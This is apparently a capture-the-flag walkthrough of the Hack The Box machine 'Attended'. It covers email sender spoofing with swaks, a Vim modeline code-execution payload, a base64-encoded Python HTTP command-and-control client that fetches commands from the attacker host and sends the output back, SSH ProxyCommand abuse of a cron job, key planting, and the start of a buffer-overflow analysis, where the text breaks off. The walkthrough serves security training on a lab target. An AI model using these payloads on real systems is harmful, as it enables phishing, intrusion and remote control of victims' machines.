Attended - Hack The Box - Insane OpenBSD - Phishing Exploit, Vim RCE, C2 Over HTTP, Exploit CronJob, Binary Exploitation

SSH and SMTP, No hostname displayed

We add attended.htb to our hosts, we also modify iptables to show when we get a remote connection. This is useful to know if we
are getting an incoming shell or we are trying to figure out if someone is attacking us.

Commands and Output:
====================================================================================================================================
┌─[user@parrot-virtual]─[~]
└──╼ $sudo iptables -A INPUT -p tcp -m state --state NEW -j LOG --log-prefix "IPTables New-Connection: " -i tun0
[sudo] password for user: 
┌─[user@parrot-virtual]─[~]
└──╼ $sudo iptables -L
Chain INPUT (policy ACCEPT)
target     prot opt source               destination         
LOG        tcp  --  anywhere             anywhere             state NEW LOG level warning prefix "IPTables New-Connection: "

Chain FORWARD (policy ACCEPT)
target     prot opt source               destination         

Chain OUTPUT (policy ACCEPT)
target     prot opt source               destination
====================================================================================================================================

Next since we saw smtp was open we will use a program called SWAKS to send mail. We will be sending email to guly based on nmap 
output.

Commands and Output:
====================================================================================================================================
swaks --to guly@attended.htb --from help@attended.htb --header "Subject: Vulnerability" --body "Hey Checkout a vulnerability in your
mail server because mail is insecure I put it on a webserver only you can access, http://10.10.14.15" --server 10.10.10.221
====================================================================================================================================

Commands and Output:
====================================================================================================================================
┌─[✗]─[user@parrot-virtual]─[~]
└──╼ $swaks --to guly@attended.htb --from help@attended.htb --header "Subject: Vulnerability" --body "Hey Checkout a vulnerability in yourmail server because mail is insecure I put it on a webserver only you can access, http://10.10.14.15" --server 10.10.10.221
=== Trying 10.10.10.221:25...
=== Connected to 10.10.10.221.
<-  220 proudly setup by guly for attended.htb ESMTP OpenSMTPD
 -> EHLO parrot-virtual
<-  250-proudly setup by guly for attended.htb Hello parrot-virtual [10.10.14.15], pleased to meet you
<-  250-8BITMIME
<-  250-ENHANCEDSTATUSCODES
<-  250-SIZE 36700160
<-  250-DSN
<-  250 HELP
 -> MAIL FROM:<help@attended.htb>
<-  250 2.0.0: Ok
 -> RCPT TO:<guly@attended.htb>
<-  250 2.1.5 Destination address valid: Recipient ok
 -> DATA
<-  354 Enter mail, end with "." on a line by itself
 -> Date: Sat, 08 May 2021 12:35:21 -0700
 -> To: guly@attended.htb
 -> From: help@attended.htb
 -> Subject: Vulnerability
 -> Message-Id: <20210508123521.215510@parrot-virtual>
 -> X-Mailer: swaks v20201014.0 jetmore.org/john/code/swaks/
 -> 
 -> Hey Checkout a vulnerability in yourmail server because mail is insecure I put it on a webserver only you can access, http://10.10.14.15
 -> 
 -> 
 -> .
<-  250 2.0.0: 474ae9da Message accepted for delivery
 -> QUIT
<-  221 2.0.0: Bye
=== Connection closed with remote host.
====================================================================================================================================

After waiting a while we notice no one is connecting to our webserver, so we loo at out iptables log files and find a connection
was made but we were not listening on the right port.

Commands and Output:
====================================================================================================================================
┌─[user@parrot-virtual]─[~]
└──╼ $sudo grep -i iptables /var/log/messages
May  8 12:36:52 parrot-virtual kernel: [160844.083857] IPTables New-Connection: IN=tun0 OUT= MAC= SRC=10.10.10.221 DST=10.10.14.15 LEN=64 TOS=0x00 PREC=0x00 TTL=63 ID=7751 DF PROTO=TCP SPT=39351 DPT=25 WINDOW=16384 RES=0x00 SYN URGP=0 
====================================================================================================================================

So what we need to do is setup and smtp server ourselves that is listening on port 25 as that is the destination port that connection
is trying to be established.

Commands and Output:
====================================================================================================================================
┌─[✗]─[user@parrot-virtual]─[~/htb/attended/www]
└──╼ $sudo python3 -m smtpd -n -c DebuggingServer 10.10.14.15:25
====================================================================================================================================

Once we get that running we immdeiately get a hit.
Commands and Output:
====================================================================================================================================
---------- MESSAGE FOLLOWS ----------
b'Received: from attended.htb (attended.htb [192.168.23.2])'
b'\tby attendedgw.htb (Postfix) with ESMTP id B304F32CD1'
b'\tfor <help@10.10.14.15>; Sat,  8 May 2021 21:40:01 +0200 (CEST)'
b'Content-Type: multipart/alternative;'
b' boundary="===============7891400444518917907=="'
b'MIME-Version: 1.0'
b'Subject: Re: Vulnerability'
b'From: guly@attended.htb'
b'X-Peer: 10.10.10.221'
b''
b'--===============7891400444518917907=='
b'Content-Type: text/plain; charset="us-ascii"'
b'MIME-Version: 1.0'
b'Content-Transfer-Encoding: 7bit'
b''
b'hello, thanks for writing.'
b"i'm currently quite busy working on an issue with freshness and dodging any email from everyone but him. i'll get back in touch as soon as possible."
b''
b''
b'---'
b'guly'
b''
b'OpenBSD user since 1995'
b'Vim power user'
b''
b'/"\\ '
b'\\ /  ASCII Ribbon Campaign'
b' X   against HTML e-mail'
b'/ \\  against proprietary e-mail attachments'
b''
b'--===============7891400444518917907==--'
------------ END MESSAGE ------------
====================================================================================================================================

Based on the message reply we can infer that guly will igonre emails that are not from freshness so we will have to send our request
impersonating the freshness user. So we swap our fake user and use freshness as the username being sent from. 

We wait for the response.
Commands and Output:
====================================================================================================================================
┌─[user@parrot-virtual]─[~/htb/attended/www]
└──╼ $sudo python3 -m smtpd -n -c DebuggingServer 10.10.14.15:25
---------- MESSAGE FOLLOWS ----------
b'Received: from attended.htb (attended.htb [192.168.23.2])'
b'\tby attendedgw.htb (Postfix) with ESMTP id 2FB8C32CD1'
b'\tfor <freshness@10.10.14.15>; Sat,  8 May 2021 21:57:37 +0200 (CEST)'
b'Content-Type: multipart/alternative;'
b' boundary="===============4649925157322745182=="'
b'MIME-Version: 1.0'
b'Subject: Re: Vulnerability'
b'From: guly@attended.htb'
b'X-Peer: 10.10.10.221'
b''
b'--===============4649925157322745182=='
b'Content-Type: text/plain; charset="us-ascii"'
b'MIME-Version: 1.0'
b'Content-Transfer-Encoding: 7bit'
b''
b'hi mate, could you please double check your attachment? looks like you forgot to actually attach anything :)'
b''
b'p.s.: i also installed a basic py2 env on gw so you can PoC quickly my new outbound traffic restrictions. i think it should stop any non RFC compliant connection.'
b''
b''
b'---'
b'guly'
b''
b'OpenBSD user since 1995'
b'Vim power user'
b''
b'/"\\ '
b'\\ /  ASCII Ribbon Campaign'
b' X   against HTML e-mail'
b'/ \\  against proprietary e-mail attachments'
b''
b'--===============4649925157322745182==--'
------------ END MESSAGE ------------
====================================================================================================================================

We will send the use an email attachment, basic python2 environment to test traffic. Also vim power user. Will send docx file.

Commands and Output:
====================================================================================================================================
swaks --to guly@attended.htb --from freshness@attended.htb --header "Subject: Vulnerability" --body "Hey Checkout a vulnerability in yourmail server because mail is insecure I put it on a webserver only you can access, http://10.10.14.15" --server 10.10.10.221 --attach @test.docx
====================================================================================================================================

We get the following back,
Commands and Output:
====================================================================================================================================
---------- MESSAGE FOLLOWS ----------
b'Received: from attended.htb (attended.htb [192.168.23.2])'
b'\tby attendedgw.htb (Postfix) with ESMTP id F2FA332CCF'
b'\tfor <freshness@10.10.14.15>; Sat,  8 May 2021 22:04:12 +0200 (CEST)'
b'Content-Type: multipart/alternative;'
b' boundary="===============3041305283362339035=="'
b'MIME-Version: 1.0'
b'Subject: Re: Vulnerability'
b'From: guly@attended.htb'
b'X-Peer: 10.10.10.221'
b''
b'--===============3041305283362339035=='
b'Content-Type: text/plain; charset="us-ascii"'
b'MIME-Version: 1.0'
b'Content-Transfer-Encoding: 7bit'
b''
b"hi mate, i'm sorry but i can't read your attachment. could you please remember i'm against proprietary e-mail attachments? :)"
b''
b''
b'---'
b'guly'
b''
b'OpenBSD user since 1995'
b'Vim power user'
b''
b'/"\\ '
b'\\ /  ASCII Ribbon Campaign'
b' X   against HTML e-mail'
b'/ \\  against proprietary e-mail attachments'
b''
b'--===============3041305283362339035==--'
------------ END MESSAGE ------------
====================================================================================================================================

We should probably remove the .docx attachment and upload non propreitary files. We also look at vim and using searchsploit we come 
to find there is remote code exploit that can be used for neovim
Commands and Output:
====================================================================================================================================
┌─[user@parrot-virtual]─[~/htb/attended/www]
└──╼ $searchsploit vim
-------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                          |  Path
-------------------------------------------------------------------------------------------------------- ---------------------------------
db Software Laboratory VImpX - 'VImpX.ocx' Multiple Vulnerabilities                                     | windows/remote/6828.html
FreeVimager 4.1.0 - Crash (PoC)                                                                         | windows/dos/23280.txt
Netrw 125 Vim Script - Multiple Command Execution Vulnerabilities                                       | linux/remote/32012.txt
Netrw Vim Script - 's:BrowserMaps()' Command Execution                                                  | multiple/local/32055.txt
Vim - 'mch_expand_wildcards()' Heap Buffer Overflow                                                     | linux/remote/32225.txt
Vim 5.x - Swap File Race Condition                                                                      | linux/local/20967.c
vim 6.3 < 6.3.082 - 'modlines' Local Command Execution                                                  | multiple/local/1119.txt
Vim 7.1.314 - Insufficient Shell Escaping Multiple Command Execution Vulnerabilities                    | linux/remote/32289.txt
Vim 7.x - Vim Script Multiple Command Execution Vulnerabilities                                         | linux/local/31911.txt
VIM 8.2 - Denial of Service (PoC)                                                                       | linux/dos/48008.txt
Vim < 8.1.1365 / Neovim < 0.3.6 - Arbitrary Code Execution                                              | linux/local/46973.md
ViMbAdmin 3.0.15 - Multiple Cross-Site Request Forgery Vulnerabilities                                  | php/webapps/41967.md
VImpX ActiveX (VImpX.ocx 4.7.3.0) - Remote Buffer Overflow                                              | windows/remote/3916.php
-------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
-------------------------------------------------------------------------------------------------------- ---------------------------------
 Paper Title                                                                                            |  Path
-------------------------------------------------------------------------------------------------------- ---------------------------------
Fuzzing VIM with AFL++ - Paper                                                                          | docs/english/48167-fuzzing-vim-w
-------------------------------------------------------------------------------------------------------- ---------------------------------
====================================================================================================================================

Code Execution, we analyze the file and see what we can do.
Commands and Output:
====================================================================================================================================
Vim < 8.1.1365 / Neovim < 0.3.6 - Arbitrary Code Execution                                              | linux/local/46973.md
====================================================================================================================================

From the exploit we can try to get the user to click and send us back a ping command that we embed in the file as follows.
Commands and Output:
====================================================================================================================================
:!uname -a||" vi:fen:fdm=expr:fde=assert_fails("source\!\ \%"):fdl=0:fdt="
..
..
..
:!ping -c 1 10.10.14.15 ||" vi:fen:fdm=expr:fde=assert_fails("source\!\ \%"):fdl=0:fdt="
====================================================================================================================================

Commands and Output:
====================================================================================================================================
┌─[✗]─[user@parrot-virtual]─[~/htb/attended/www]
└──╼ $sudo tcpdump -i tun0 icmp
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
13:23:09.272556 IP attended.htb > 10.10.14.15: ICMP echo request, id 52636, seq 0, length 64
13:23:09.272607 IP 10.10.14.15 > attended.htb: ICMP echo reply, id 52636, seq 0, length 64
====================================================================================================================================

Server response
Commands and Output:
====================================================================================================================================
└──╼ $sudo python3 -m smtpd -n -c DebuggingServer 10.10.14.15:25
[sudo] password for user: 
---------- MESSAGE FOLLOWS ----------
b'Received: from attended.htb (attended.htb [192.168.23.2])'
b'\tby attendedgw.htb (Postfix) with ESMTP id 8742032CCF'
b'\tfor <freshness@10.10.14.15>; Sat,  8 May 2021 22:26:12 +0200 (CEST)'
b'Content-Type: multipart/alternative;'
b' boundary="===============8925737832326197162=="'
b'MIME-Version: 1.0'
b'Subject: Re: Vulnerability'
b'From: guly@attended.htb'
b'X-Peer: 10.10.10.221'
b''
b'--===============8925737832326197162=='
b'Content-Type: text/plain; charset="us-ascii"'
b'MIME-Version: 1.0'
b'Content-Transfer-Encoding: 7bit'
b''
b"thanks dude, i'm currently out of the office but will SSH into the box immediately and open your attachment with vim to verify its syntax."
b'if everything is fine, you will find your config file within a few minutes in the /home/shared folder.'
b'test it ASAP and let me know if you still face that weird issue.'
b''
b''
b'---'
b'guly'
b''
b'OpenBSD user since 1995'
b'Vim power user'
b''
b'/"\\ '
b'\\ /  ASCII Ribbon Campaign'
b' X   against HTML e-mail'
b'/ \\  against proprietary e-mail attachments'
b''
b'--===============8925737832326197162==--'
------------ END MESSAGE ------------
====================================================================================================================================

What we can now do is attempt to get a reverse shell, however a standard reverse shell will not work a based on previous emails
we need RFC compliant connections.

There is a protocol filter on the firewall, but python2 is installed in the box.
We will create what is called a web cradle to get a remote connection.

We will do that by editing our vim file.

We create our C2 files which are client.py, terminal.py, listener.py, and main.py, should be able to find the code in c2 folder.
We will convert our client.py into base64 and send it via email.
Commands and Output:
====================================================================================================================================
┌─[✗]─[user@parrot-virtual]─[~/htb/attended/c2]
└──╼ $base64 -w 0 client.py 
aW1wb3J0IHJlcXVlc3RzCmltcG9ydCBvcwpmcm9tIHRpbWUgaW1wb3J0IHNsZWVwCgp3aGlsZSBUcnVlOgogICAgciA9IHJlcXVlc3RzLmdldCgiaHR0cDovLzEwLjEwLjE0LjE1IikKICAgIG91dHB1dCA9IG9zLnBvcGVuKHIudGV4dCwgJ3InLCAxKQogICAgcGF5bG9hZCA9IHsgJ3EnOiBvdXRwdXQgfQogICAgcmVxdWVzdHMuZ2V0KCJodHRwOi8vMTAuMTAuMTQuMTUvb3V0cHV0IiwgcGFyYW1zPXBheWxvYWQpCiAgICBzbGVlcCguMjUpCgo=
====================================================================================================================================

If we send the email back with the modified payload that includes the base64 encoded string we should now get a response back from
the server.
Commands and Output:
====================================================================================================================================
┌─[✗]─[user@parrot-virtual]─[~/htb/attended/www]
└──╼ $cat vim.txt 
:!python2 -c 'from base64 import b64decode; exec(b64decode("aW1wb3J0IHJlcXVlc3RzCmltcG9ydCBvcwpmcm9tIHRpbWUgaW1wb3J0IHNsZWVwCgp3aGlsZSBUcnVlOgogICAgciA9IHJlcXVlc3RzLmdldCgiaHR0cDovLzEwLjEwLjE0LjE1IikKICAgIG91dHB1dCA9IG9zLnBvcGVuKHIudGV4dCwgJ3InLCAxKQogICAgcGF5bG9hZCA9IHsgJ3EnOiBvdXRwdXQgfQogICAgcmVxdWVzdHMuZ2V0KCJodHRwOi8vMTAuMTAuMTQuMTUvb3V0cHV0IiwgcGFyYW1zPXBheWxvYWQpCiAgICBzbGVlcCguMjUpCgo="))'||" vi:fen:fdm=expr:fde=assert_fails("source\!\ \%"):fdl=0:fdt="
====================================================================================================================================

Commands and Output:
====================================================================================================================================
┌─[✗]─[user@parrot-virtual]─[~/htb/attended/c2]
└──╼ $sudo python main.py 
$ > Starting webserver
whoami
$ > 
guly
====================================================================================================================================

Once inside we can query for items but can't cat large files and such, otherwise no output is returned, we find a a config swap file
inside the tmp directory in hour home folder we can't cat it but we can use strings to extract data from the file
Commands and Output:
====================================================================================================================================
$ > ls -la
$ > 
total 60
drwxr-x---  4 guly  guly    512 May  9 05:47 .
drwxr-xr-x  5 root  wheel   512 Jun 26  2019 ..
-rw-r--r--  1 guly  guly     87 Apr 13  2019 .Xdefaults
-rw-r--r--  1 guly  guly    771 Apr 13  2019 .cshrc
-rw-r--r--  1 guly  guly    101 Apr 13  2019 .cvsrc
-rw-r--r--  1 guly  guly    359 Apr 13  2019 .login
-rw-r--r--  1 guly  guly    175 Apr 13  2019 .mailrc
-rw-r--r--  1 guly  guly    215 Apr 13  2019 .profile
drwx------  2 root  wheel   512 Jun 26  2019 .ssh
-rw-------  1 guly  guly      0 Dec 15 17:05 .viminfo
-rw-r-----  1 guly  guly     13 Jun 26  2019 .vimrc
-rwxrwxrwx  1 root  guly   6789 Dec  4 09:07 gchecker.py
-rw-------  1 guly  guly      0 May  9 05:34 mbox
drwxr-xr-x  2 guly  guly    512 Jun 26  2019 tmp
ls -la tmp
$ > 
total 32
drwxr-xr-x  2 guly  guly    512 Jun 26  2019 .
drwxr-x---  4 guly  guly    512 May  9 05:47 ..
-rwxr-x---  1 guly  guly  12288 Jun 26  2019 .config.swp
strings tmp/.config.swp
$ > 
b0VIM 8.1
guly
attended.htb
~guly/tmp/.ssh/config
U3210
#"!
ServerAliveInterval 60
TCPKeepAlive yes
ControlPersist 4h
ControlPath /tmp/%r@%h:%p
ControlMaster auto
User freshness
Host *
====================================================================================================================================

Looks like an ssh config, one of the features of ssh configs is a proxy command.
Proxy command through a jump host.
We are going to create a config.

Commands and Output:
====================================================================================================================================
echo "Host *" > hacker.config
echo "  ProxyCommand python2 -c 'from base64 import b64decode; exec(b64decode(\"aW1wb3J0IHJlcXVlc3RzCmltcG9ydCBvcwpmcm9tIHRpbWUgaW1wb3J0IHNsZWVwCgp3aGlsZSBUcnVlOgogICAgciA9IHJlcXVlc3RzLmdldCgiaHR0cDovLzEwLjEwLjE0LjE1IikKICAgIG91dHB1dCA9IG9zLnBvcGVuKHIudGV4dCwgJ3InLCAxKQogICAgcGF5bG9hZCA9IHsgJ3EnOiBvdXRwdXQgfQogICAgcmVxdWVzdHMuZ2V0KCJodHRwOi8vMTAuMTAuMTQuMTUvb3V0cHV0IiwgcGFyYW1zPXBheWxvYWQpCiAgICBzbGVlcCguMjUpCgo=\"))'" >> hacker.config
====================================================================================================================================

We cancel our current c2 server connection and restart and wait for the config file for ssh to work it's magic so that we can login
as the freshness user on the server.
Commands and Output:
====================================================================================================================================
└──╼ $sudo python main.py 
Starting webserver
$ > 
whoami
$ > ls
$ > 
authkeys
dead.letter
fchecker.py
user.txt
whoami
$ > 
freshness
====================================================================================================================================

The next thing to do is to try and get a better shell, to do this we need to make sure we can write to the .ssh directory and submit
our public key to the server.
Commands and Output:
====================================================================================================================================
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDKf3s+onWRk9g0bGjm5Nvv15TCUPNKFDxdGIZBgXRGfnwFcrih43O6W6ViOdVn2f5ujLeehYyTr2HQEIiTTsx/oTRXDWTC7QAC/gsa+xeBY9i5cBEdseO8XDej3/Er7z76tMThgsPy9/5wbDSI7e6St2rvsgQLgTgw/u+4ta67c68S8u2snqXEZ8MrJVeK08U1TE5voxXTGFvfB/I/cDeqhF1d49E2Y+QlPefb8B46W37VXbYp+AsKDirWaWcZYa5cgsJtiYhYMr5vagTwjAFWMiQuQ63NhjUqOrxghAuXSx9AlG8nrw82KWIGsdyvEsXZr6BMNTp96En+Z46IjcmRQRdDd+3vytmH0JVnpe0TdxxYp3esFi2jYoP/MOi4mf41dfDO4LG+JV4erv67EsHzaekmuDbSXTZhd9ypO8XUxLg7T0KxwR07hNOvVU2fnoS/y2FSjCNolLYE/39OKJwUFlcgeolSmWo9S24Ia4qjjqSZF+lD4s3kbGlVMnzqExs= user@parrot-virtual" >> .ssh/authorized_keys
====================================================================================================================================

Once this is done we can now login to the server no issues from ssh.
Commands and Output:
====================================================================================================================================
┌─[user@parrot-virtual]─[~/htb/attended/ssh]
└──╼ $ssh freshness@10.10.10.221 -i attended_id_rsa 
The authenticity of host '10.10.10.221 (10.10.10.221)' can't be established.
ECDSA key fingerprint is SHA256:q4QC7yb0+LQiv7n38Xz6Aa9un037yrSQr7WeeY+JyTY.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.221' (ECDSA) to the list of known hosts.
Last login: Mon Nov 16 13:29:26 2020 from 10.10.14.5
OpenBSD 6.5 (GENERIC) #13: Sun May 10 23:16:59 MDT 2020

Welcome to OpenBSD: The proactively secure Unix-like operating system.

Please use the sendbug(1) utility to report bugs in the system.
Before reporting a bug, please try to reproduce it with the latest
version of the code.  With bug reports, please try to ensure that
enough information to reproduce the problem is enclosed, and if a
known fix for it exists, include that as well.

attended$ whoami
freshness
====================================================================================================================================

We can now get off of the c2 server we created since it is a pain to navigate through.

We check the file fchecker.py in the home directory
Commands and Output:
====================================================================================================================================
attended$ cat fchecker.py                                                                                           
#!/usr/local/bin/python2.7
import os,sys
import subprocess
import time

path = '/home/shared/'
command = '/usr/bin/ssh -l freshness -F %s 127.0.0.1'
for r, d, fs in os.walk(path):
        for f in fs:
                cfile = os.path.join(r, f)
                c = command % cfile
                #print "running %s" % c
                p = subprocess.Popen(c,shell=True)
		time.sleep(0.2)
                os.unlink(cfile)
====================================================================================================================================

Basically does script based onthe crontab by the user
Commands and Output:
====================================================================================================================================
attended$ crontab -l
* * * * * /home/freshness/fchecker.py
====================================================================================================================================

Let's look at authkeys
Commands and Output:
====================================================================================================================================
attended$ ls
authkeys    dead.letter fchecker.py user.txt
attended$ ls -la
total 24
drwxr-x---  2 freshness  freshness   512 Nov 16 13:57 .
drwxr-x---  4 freshness  freshness   512 Nov 12 16:56 ..
-rw-r--r--  1 root       wheel      5424 Nov 16 13:35 authkeys
-rw-r-----  1 root       freshness   178 Nov  6  2019 note.txt
====================================================================================================================================

We can't execute it but we can definitely copy it to our local filesystem using scp.
Commands and Output:
====================================================================================================================================
┌─[user@parrot-virtual]─[~/htb/attended/ssh]
└──╼ $scp -r -i attended_id_rsa freshness@10.10.10.221:~/authkeys .
note.txt                                                                                                100%  178     1.9KB/s   00:00
authkeys                                                                                                100% 5424    29.1KB/s   00:00
====================================================================================================================================

We can run it to check what the output is.
Commands and Output:
====================================================================================================================================
┌─[user@parrot-virtual]─[~/htb/attended/ssh/authkeys]
└──╼ $./authkeys 
Too bad, Wrong number of arguments!
Segmentation fault
====================================================================================================================================

Issue arise when opening BSD binaries with Ghidra so instead we can use IDA
We will also install openbsd for us to analyze the binary fully. We create the machine and should be able to automatically ssh in
Commands and Output:
====================================================================================================================================
┌─[user@parrot-virtual]─[~/htb/attended/ssh]
└──╼ $ssh root@192.168.33.8
The authenticity of host '192.168.33.8 (192.168.33.8)' can't be established.
ECDSA key fingerprint is SHA256:FjjDLVTM9LFusiiY5Lf03+v/xGJDPw8fxjDCwH/13fc.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.33.8' (ECDSA) to the list of known hosts.
root@192.168.33.8's password: 
Last login: Sun May  9 06:18:04 2021
OpenBSD 6.9 (GENERIC) #464: Mon Apr 19 10:28:56 MDT 2021

Welcome to OpenBSD: The proactively secure Unix-like operating system.

Please use the sendbug(1) utility to report bugs in the system.
Before reporting a bug, please try to reproduce it with the latest
version of the code.  With bug reports, please try to ensure that
enough information to reproduce the problem is enclosed, and if a
known fix for it exists, include that as well.

foo#                                                                                                                            
====================================================================================================================================

We can also add python3 and python2 
Commands and Output:
====================================================================================================================================
foo# pkg_add python3
quirks-3.632 signed on 2021-05-08T19:31:59Z
quirks-3.632: ok
python3-3.8p0:sqlite3-3.34.1: ok
python3-3.8p0:libiconv-1.16p0: ok
python3-3.8p0:gettext-runtime-0.21p1: ok
python3-3.8p0:libffi-3.3: ok
python3-3.8p0:bzip2-1.0.8p0: ok
python3-3.8p0:xz-5.2.5: ok
python3-3.8p0:python-3.8.8p0: ok
python3-3.8p0: ok
====================================================================================================================================

Now we copy the authkeys file to the newly created vm.
Commands and Output:
====================================================================================================================================
foo# pkg_add wget
quirks-3.632 signed on 2021-05-08T19:31:59Z
wget-1.20.3p3:libunistring-0.9.7: ok
wget-1.20.3p3:libidn2-2.3.0p0: ok
wget-1.20.3p3:pcre2-10.36: ok
wget-1.20.3p3:libpsl-0.21.1: ok
wget-1.20.3p3: ok
foo# wget 192.168.33.7:8000/authkeys             
--2021-05-09 13:31:28--  http://192.168.33.7:8000/authkeys
Connecting to 192.168.33.7:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 5424 (5.3K) [application/octet-stream]
Saving to: 'authkeys'

authkeys                           100%[==============================================================>]   5.30K  --.-KB/s    in 0s 

2021-05-09 13:31:28 (92.4 MB/s) - 'authkeys' saved [5424/5424]

foo# ls
authkeys
foo# file authkeys                                                                                                              
authkeys: ELF 64-bit LSB executable, x86-64, version 1
foo# 
foo# ./authkeys                                                                                                                 
ksh: ./authkeys: cannot execute - Permission denied
foo# chmod 700 authkeys                                                                                                         
foo# ./authkeys                                                                                                                 
Too bad, Wrong number of arguments!
foo# 
====================================================================================================================================

We also install the enhanced version of gdb 
Commands and Output:
====================================================================================================================================
foo# pkg_add gdb   
quirks-3.632 signed on 2021-05-08T19:31:59Z
gdb-7.12.1p16: ok
foo# egdb
GNU gdb (GDB) 7.12.1
Copyright (C) 2017 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-unknown-openbsd6.9".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word".
(gdb) 
====================================================================================================================================

We also install GEF, 
Commands and Output:
====================================================================================================================================
foo# cd
foo# wget -O ~/.gdbinit-gef.py -q http://gef.blah.cat/py
foo# echo source ~/.gdbinit-gef.py >> ~/.gdbinit

..
..
..
foo# egdb authkeys                                                                                                                       
GNU gdb (GDB) 7.12.1
Copyright (C) 2017 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-unknown-openbsd6.9".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
GEF for openbsd ready, type `gef' to start, `gef config' to configure
87 commands loaded for GDB 7.12.1 using Python engine 3.8
[*] 5 commands could not be loaded, run `gef missing` to know why.
Reading symbols from authkeys...(no debugging symbols found)...done.
Python Exception <class 'UnicodeEncodeError'> 'ascii' codec can't encode character '\u27a4' in position 12: ordinal not in range(128): 

====================================================================================================================================

We can correct the GEF error by exporting certain LCTYPE to UTF8
Commands and Output:
====================================================================================================================================
foo# export LC_CTYPE=C.UTF-8
foo# egdb
====================================================================================================================================

We start running the buffer overflow, as previously noted we need to base64 encode the string in order to have it successfully run 
correctly and gives us the overflow.
Commands and Output:
====================================================================================================================================
gef➤  pattern create
[+] Generating a pattern of 1024 bytes
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaaaaabnaaaaaaboaaaaaabpaaaaaabqaaaaaabraaaaaabsaaaaaabtaaaaaabuaaaaaabvaaaaaabwaaaaaabxaaaaaabyaaaaaabzaaaaaacbaaaaaaccaaaaaacdaaaaaaceaaaaaacfaaaaaacgaaaaaachaaaaaaciaaaaaacjaaaaaackaaaaaaclaaaaaacmaaaaaacnaaaaaacoaaaaaacpaaaaaacqaaaaaacraaaaaacsaaaaaactaaaaaacuaaaaaacvaaaaaacwaaaaaacxaaaaaacyaaaaaaczaaaaaadbaaaaaadcaaaaaaddaaaaaadeaaaaaadfaaaaaadgaaaaaadhaaaaaadiaaaaaadjaaaaaadkaaaaaadlaaaaaadmaaaaaadnaaaaaadoaaaaaadpaaaaaadqaaaaaadraaaaaadsaaaaaadtaaaaaaduaaaaaadvaaaaaadwaaaaaadxaaaaaadyaaaaaadzaaaaaaebaaaaaaecaaaaaaedaaaaaaeeaaaaaaefaaaaaaegaaaaaaehaaaaaaeiaaaaaaejaaaaaaekaaaaaaelaaaaaaemaaaaaaenaaaaaaeoaaaaaaepaaaaaaeqaaaaaaeraaaaaaesaaaaaaetaaaaaaeuaaaaaaevaaaaaaewaaaaaaexaaaaaaeyaaaaaaezaaaaaafbaaaaaafcaaaaaaf
[+] Saved as '$_gef0'
gef➤  
